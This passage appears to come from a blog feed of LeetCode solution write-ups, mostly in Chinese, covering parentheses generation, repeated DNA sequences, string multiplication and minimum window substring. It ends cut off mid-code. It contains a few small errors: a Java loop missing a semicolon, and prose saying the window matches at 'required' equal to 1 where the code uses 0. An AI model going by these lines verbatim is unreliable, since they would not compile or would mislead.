<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &quot;((()))&quot;,</span><br><span class="line">  &quot;(()())&quot;,</span><br><span class="line">  &quot;(())()&quot;,</span><br><span class="line">  &quot;()(())&quot;,</span><br><span class="line">  &quot;()()()&quot;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="中文题目"><a href="#中文题目" class="headerlink" title="中文题目"></a>中文题目</h2><p>罗列出n组括号的所有合法的排列组合。<br>注意点：</p>
<p>只有一种括号形式<code>()</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">例子：</span><br><span class="line"></span><br><span class="line">输入: n = 3 输出: [&apos;((()))&apos;, &apos;(()())&apos;, &apos;(())()&apos;, &apos;()(())&apos;, &apos;()()()&apos;]</span><br></pre></td></tr></table></figure>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>解题思路：回溯法，递归的思想，判断匹配成功（递归返回）的条件为：左右括号数保持一致并且括号字符串的长度等于$2\times N$。</p>
<ol>
<li>只要左括号<code>(</code>的数量没有超过N，都可以插入左括号<code>(</code>。</li>
<li>插入右括号<code>)</code>的前提则是当前的左括号<code>(</code>数量必须要多于当前的右括号<code>)</code>数量。</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generateParenthesis</span><span class="params">(self, N)</span>:</span></span><br><span class="line">        ans = []</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">backtrack</span><span class="params">(S = <span class="string">''</span>, left = <span class="number">0</span>, right = <span class="number">0</span>)</span>:</span></span><br><span class="line">            print(S)</span><br><span class="line">            <span class="keyword">if</span> len(S) == <span class="number">2</span> * N:</span><br><span class="line">                ans.append(S)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">if</span> left &lt; N:</span><br><span class="line">                backtrack(S +<span class="string">'('</span>, left+<span class="number">1</span>, right)</span><br><span class="line">            <span class="keyword">if</span> right &lt; left:</span><br><span class="line">                backtrack(S +<span class="string">')'</span>, left, right+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        backtrack()</span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure>
<p>Your runtime beats 100.00 % of python3 submissions.</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Backtracking </tag>
            
            <tag> Leetcode </tag>
            
            <tag> String </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[187. Repeated DNA Sequences]]></title>
      <url>/wiki/2017/10/10/Leetcode-187-Repeated-DNA-Sequences/</url>
      <content type="html"><![CDATA[<p>All DNA is composed of a series of nucleotides abbreviated as A, C, G, and T, for example: “ACGAATTCCG”. When studying DNA, it is sometimes useful to identify repeated sequences within the DNA.</p>
<p>Write a function to find all the 10-letter-long sequences (substrings) that occur more than once in a DNA molecule.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: s = &quot;AAAAACCCCCAAAAACCCCCCAAAAAGGGTTT&quot;</span><br><span class="line"></span><br><span class="line">Output: [&quot;AAAAACCCCC&quot;, &quot;CCCCCAAAAA&quot;]</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>最直接的方法是依次取出长度为10的子字符串，放入哈希表中，计算子字符串出现的次数。当子字符串出现的次数大于1时，加入到结果中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">findRepeatedDnaSequences</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="keyword">null</span> || s.length() &lt; <span class="number">10</span>) <span class="keyword">return</span> list;</span><br><span class="line">    HashMap&lt;String, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">10</span>; i &lt;= s.length(); i++) &#123;</span><br><span class="line">        String sub = s.substring(i - <span class="number">10</span>, i);</span><br><span class="line">        map.put(sub, map.getOrDefault(sub, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Integer&gt; entry : map.entrySet())</span><br><span class="line">        <span class="keyword">if</span> (entry.getValue() &gt; <span class="number">1</span>) list.add(entry.getKey());</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用位操作也可以寻找到重复的子字符串。方法是将字符A、C、G、T映射成数字0，1，2，3。注意到数字0，1，2，3对应的二进制数字的有效位数为2，那么我们可以用两个二进制位来表示一个字符，也就是说用20个二进制位来表示一个长度为10的字符串。既然一个整数int长度为32位，那么可以用int来表示长度为10的字符串。所以只需要验证整数是否重复出现，来代替验证子字符串是否重复出现。一方面节省了空间复杂度（一个整数比10个字符占用的空间小），另一方面节省了时间复杂度（整数的<code>hashCode()</code>计算比字符串要简单，整数的hash值即为整数本身）。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">findRepeatedDnaSequences</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    Set&lt;Integer&gt; words = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    Set&lt;Integer&gt; doubleWords = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    List&lt;String&gt; rv = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="comment">// 将字符映射成数字</span></span><br><span class="line">    <span class="keyword">char</span>[] map = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">26</span>];</span><br><span class="line">    map[<span class="string">'A'</span> - <span class="string">'A'</span>] = <span class="number">0</span>;</span><br><span class="line">    map[<span class="string">'C'</span> - <span class="string">'A'</span>] = <span class="number">1</span>;</span><br><span class="line">    map[<span class="string">'G'</span> - <span class="string">'A'</span>] = <span class="number">2</span>;</span><br><span class="line">    map[<span class="string">'T'</span> - <span class="string">'A'</span>] = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length() - <span class="number">9</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> v = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 将长度位10的字符串转化为一个整数</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &lt; i + <span class="number">10</span>; j++) &#123;</span><br><span class="line">            v &lt;&lt;= <span class="number">2</span>;</span><br><span class="line">            v |= map[s.charAt(j) - <span class="string">'A'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 查看是否已经访问过该字符串</span></span><br><span class="line">        <span class="keyword">if</span>(!words.add(v) &amp;&amp; doubleWords.add(v))</span><br><span class="line">            rv.add(s.substring(i, i + <span class="number">10</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rv;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Can we do better? YES! 上面说到只需要20位二进制数字就可以表示长度为10的子字符串，但是在构建对应的数字的时候，每次都是从头开始的，有这个必要吗？其实每次左移2位，然后取最低20位就可以了！</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">findRepeatedDnaSequences</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    Set&lt;Integer&gt; words = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    Set&lt;Integer&gt; doubleWords = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    List&lt;String&gt; rv = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">char</span>[] map = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">26</span>];</span><br><span class="line">    map[<span class="string">'A'</span> - <span class="string">'A'</span>] = <span class="number">0</span>;</span><br><span class="line">    map[<span class="string">'C'</span> - <span class="string">'A'</span>] = <span class="number">1</span>;</span><br><span class="line">    map[<span class="string">'G'</span> - <span class="string">'A'</span>] = <span class="number">2</span>;</span><br><span class="line">    map[<span class="string">'T'</span> - <span class="string">'A'</span>] = <span class="number">3</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> v = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span> i &lt; s.length(); i++) &#123;</span><br><span class="line">        <span class="comment">// 每次取出最低20位二进制数字</span></span><br><span class="line">        v = ((v &lt;&lt; <span class="number">2</span>) | (map[s.charAt(i) - <span class="string">'A'</span>])) &amp; <span class="number">0xfffff</span>;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">9</span>) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(!words.add(v) &amp;&amp; doubleWords.add(v))</span><br><span class="line">            rv.add(s.substring(i - <span class="number">9</span>, i + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rv;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Hash Table </tag>
            
            <tag> Bit Manipulation </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[43. Multiply Strings]]></title>
      <url>/wiki/2017/10/10/Leetcode-43-Multiply-Strings/</url>
      <content type="html"><![CDATA[<p>Given two non-negative integers <code>num1</code> and <code>num2</code> represented as strings, return the product of <code>num1</code> and <code>num2</code>, also represented as a string.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: num1 = &quot;2&quot;, num2 = &quot;3&quot;</span><br><span class="line">Output: &quot;6&quot;</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: num1 = &quot;123&quot;, num2 = &quot;456&quot;</span><br><span class="line">Output: &quot;56088&quot;</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>The length of both <code>num1</code> and <code>num2</code> is &lt; 110.</li>
<li>Both <code>num1</code> and <code>num2</code> contain only digits <code>0-9</code>.</li>
<li>Both <code>num1</code> and <code>num2</code> do not contain any leading zero, except the number 0 itself.</li>
<li>You must not use any built-in BigInteger library or convert the inputs to integer directly.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>两个数相乘，以我们小学时学的方法：</p>
<ol>
<li>将第二个数字的每个数与第一个数相乘</li>
<li>将第一步的结果相加</li>
</ol>
<p>例如296*31。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15402195188267.jpg" alt=""></p>
<p>仿照这个步骤，构造两个循环。内循环计算步骤1，外循环计算步骤2。<code>add()</code>是将两个数相加的方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">multiply</span><span class="params">(String num1, String num2)</span> </span>&#123;</span><br><span class="line">    StringBuilder s = <span class="keyword">new</span> StringBuilder(<span class="string">"0"</span>);</span><br><span class="line">    <span class="keyword">char</span>[] n1 = num1.toCharArray(), n2 = num2.toCharArray();</span><br><span class="line">    <span class="keyword">int</span> carry = <span class="number">0</span>, l1 = num1.length(), l2 = num2.length();</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; l1) &#123;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">        StringBuilder t = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">while</span> (j &lt; l2 || carry != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (j &lt; l2) num += (n1[l1 - i - <span class="number">1</span>] - <span class="string">'0'</span>) * (n2[l2 - j - <span class="number">1</span>] - <span class="string">'0'</span>);</span><br><span class="line">            num += carry;</span><br><span class="line">            carry = num / <span class="number">10</span>;</span><br><span class="line">            num = num % <span class="number">10</span>;</span><br><span class="line">            t.append(num);</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        t.reverse();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; i; k++)</span><br><span class="line">            t.append(<span class="string">"0"</span>);</span><br><span class="line">        s = add(s, t);</span><br><span class="line">        i++; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (s.charAt(<span class="number">0</span>) == <span class="string">'0'</span>) <span class="keyword">return</span> <span class="string">"0"</span>;</span><br><span class="line">    <span class="keyword">return</span> s.toString();</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> StringBuilder <span class="title">add</span><span class="params">(StringBuilder num1, StringBuilder num2)</span> </span>&#123;</span><br><span class="line">    StringBuilder s = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">int</span> carry = <span class="number">0</span>, l1 = num1.length(), l2 = num2.length();</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; l1 || i &lt; l2 || carry != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; l1) num += num1.charAt(l1 - i - <span class="number">1</span>) - <span class="string">'0'</span>;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; l2) num += num2.charAt(l2 - i - <span class="number">1</span>) - <span class="string">'0'</span>;</span><br><span class="line">        num += carry;</span><br><span class="line">        <span class="keyword">if</span> (num &gt; <span class="number">9</span>) &#123;</span><br><span class="line">            num -= <span class="number">10</span>; carry = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> carry = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        s.append(num);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.reverse();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种方法虽然比较直接，但是运算速度慢，主要原因是</p>
<ul>
<li>每个中间结果都用字符串保存，空间复杂度增加</li>
<li>字符串反复遍历，时间复杂度增加</li>
</ul>
<p>有一种非常简单、优雅的方法，它利用了两个数相乘以后(步骤1)在结果中的相对位置，而且是一个数和一个数相乘，简化了复杂的内循环。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/LeetCode44.jpg" alt="LeetCode44"></p>
<p>根据上图可以看到：  <code>num1[i] * num2[j]</code> 的结果会在 <code>[i + j</code>, <code>i + j + 1]</code> 的位置上。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">multiply</span><span class="params">(String num1, String num2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> l1 = num1.length(), l2 = num2.length();</span><br><span class="line">    <span class="keyword">int</span>[] pos = <span class="keyword">new</span> <span class="keyword">int</span>[l1 + l2];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = l1 - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = l2 - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">            <span class="keyword">int</span> mul = (num1.charAt(i) - <span class="string">'0'</span>) * (num2.charAt(j) - <span class="string">'0'</span>); </span><br><span class="line">            <span class="keyword">int</span> p1 = i + j, p2 = i + j + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> sum = mul + pos[p2];</span><br><span class="line"></span><br><span class="line">            pos[p1] += sum / <span class="number">10</span>;</span><br><span class="line">            pos[p2] = (sum) % <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">    </span><br><span class="line">    StringBuilder s = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> p : pos) </span><br><span class="line">        <span class="comment">// special occasion: like "0000"</span></span><br><span class="line">        <span class="keyword">if</span>(!(s.length() == <span class="number">0</span> &amp;&amp; p == <span class="number">0</span>)) s.append(p);</span><br><span class="line">    <span class="keyword">return</span> s.length() == <span class="number">0</span> ? <span class="string">"0"</span>: s.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> String </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[76. Minimum Window Substring]]></title>
      <url>/wiki/2017/10/10/Leetcode-76-Minimum-Window-Substring/</url>
      <content type="html"><![CDATA[<p>Given a string S and a string T, find the minimum window in S which will contain all the characters in T in complexity $O(n)$.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: S = &quot;ADOBECODEBANC&quot;, T = &quot;ABC&quot;</span><br><span class="line">Output: &quot;BANC&quot;</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>If there is no such window in $S$ that covers all characters in $T$, return the empty string <code>&quot;&quot;</code>.</li>
<li>If there is such window, you are guaranteed that there will always be only one unique minimum window in $S$.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>滑动窗口题，该题型出现在字符串中，往往涉及两个字符串。既然是滑动窗口，那必然需要左指针和右指针维持滑动窗口的位置。不断移动左指针和右指针，直到右指针移动到字符串末尾。可以用一个哈希表<code>map</code>存储需要匹配的每个不同字符的个数，用<code>required</code>表示需要匹配的不同字符个数。当右指针指向的字符匹配时，将<code>map</code>中相应的匹配的字符个数减去1；当该字符的需要匹配数等于0时，也就是该字符已完成匹配，把<code>required</code>减去1。当<code>required</code>等于1时，也就是所有字符都匹配完成时，这个滑动窗口就是匹配的窗口，这时试图移动左指针向前，直到该滑动窗口不再匹配。重复上述过程，可以寻找到最小的窗口。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">minWindow</span><span class="params">(String s, String t)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s == <span class="keyword">null</span> || t == <span class="keyword">null</span> || s.length() == <span class="number">0</span> || t.length() == <span class="number">0</span>) <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 哈希表保存所有的t中不同字符的个数</span></span><br><span class="line">    Map&lt;Character, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> c : t.toCharArray())</span><br><span class="line">        map.put(c, map.getOrDefault(c, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// t中不同字符的个数，即滑动窗口中需要匹配的不同字符个数</span></span><br><span class="line">    <span class="comment">// 当required = 0， 即完成匹配</span></span><br><span class="line">    <span class="keyword">int</span> required = map.size();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 左右指针</span></span><br><span class="line">    <span class="keyword">int</span> l = <span class="number">0</span>, r = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 窗口长度，窗口的左边</span></span><br><span class="line">    <span class="keyword">int</span> minLength = Integer.MAX_VALUE, minLeft = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (r &lt; s.length()) &#123;</span><br><span class="line">        <span class="comment">// 把当前字符加入到窗口中</span></span><br><span class="line">        <span class="keyword">char</span> c = s.charAt(r);</span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(c)) map.put(c, map.getOrDefault(c, <span class="number">0</span>) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果当前字符在滑动窗口中的出现的个数等于需要的个数，那么把需要匹配的字符数required减去1</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(c) &amp;&amp; map.get(c) == <span class="number">0</span>) required--;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 尝试收缩滑动窗口，直到最佳</span></span><br><span class="line">        <span class="keyword">while</span> (required == <span class="number">0</span>) &#123;</span><br><span class="line">            c = s.charAt(l);</span><br><span class="line">            <span class="comment">// 保存当前窗口</span></span><br><span class="line">            <span class="keyword">if</span> (r - l + <span class="number">1</span> &lt; minLength) &#123;</span><br><span class="line">                minLength = r - l + <span class="number">1</span>;</span><br><span class="line">                minLeft = l;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 由于窗口缩小了，需要最左边字符的数量加1</span></span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(c))  map.put(c, map.get(c) + <span class="number">1</span>);</span><br><span class="line">            <span class="comment">// 字符数量不等于0，表明需要匹配的字符数required加1，滑动窗口不再符合</span></span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(c) &amp;&amp; map.get(c) &gt; <span class="number">0</span>) required++;</span><br><span class="line">            <span class="comment">// 移动左指针向前，寻找一个新的窗口</span></span><br><span class="line">            l++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当收缩窗口完成以后，继续扩展窗口</span></span><br><span class="line">        r++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> minLength == Integer.MAX_VALUE ? <span class="string">""</span> : s.substring(minLeft, minLeft + minLength);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>值得注意的是其实<code>if (map.containsKey(c))</code>这个判断可以去掉，因为如果$t$中不出现的字符加入的话，由于起始值为0，所以其在哈希表中的值始终为负，不影响判断。</p>
<p>有没有更快的方法？其实所有用哈希表存储字符的题目都可以用整型数组<code>int[] array</code>代替<code>HashMap</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">minWindow</span><span class="params">(String s, String t)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s == <span class="keyword">null</span> || t == <span class="keyword">null</span> || s.length() == <span class="number">0</span> || t.length() == <span class="number">0</span>) <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 哈希表保存所有的t中所有的字符的计数</span></span><br><span class="line">    <span class="keyword">int</span> [] map = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> c : t.toCharArray())</span><br><span class="line">        map[c]++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// t中字符的数量，窗口中需要匹配的字符数</span></span><br><span class="line">    <span class="keyword">int</span> required = <span class="number">0</span>;</span><br><span 